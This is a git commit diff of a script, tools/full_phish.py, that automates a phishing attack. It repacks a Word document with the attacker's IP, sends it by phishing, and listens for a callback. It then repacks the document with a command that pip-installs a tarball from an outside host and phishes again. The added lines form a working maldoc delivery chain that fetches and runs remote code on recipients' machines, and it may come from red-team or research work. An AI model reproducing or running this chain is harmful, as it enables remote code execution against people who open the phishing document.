3211e8925fa00101e133d60675f8b0d857b046b9
Justin Azoff <justin.azoff@gmail.com>
2017-12-19 12:52:35 -0500

    reorder output

--- tools/full_phish.py
+++ tools/full_phish.py
@@ -7,10 +7,21 @@ import phish
 def full_phish(cmd):
     port = 44440
     my_ip = listener.get_external_ip()
+    print("Using", my_ip, "as external IP")
+
     repack_word_doc.repack(ip=my_ip, port=port)
     phish.phish()
 
     contents = listener.listen_once(port)
+    print("Got:")
+    print(contents.decode())
+
+    print("Baseline worked.. running real command..")
+    repack_word_doc.repack(command="C:/Progra~1/Python36/python.exe -m pip install https://www.bouncybouncy.net/ud.tar.gz")
+    phish.phish()
+
+    print("Using", my_ip, "as external IP")
+    contents = listener.listen_once(44665)
     print("Got:")
     print(contents.decode())
 
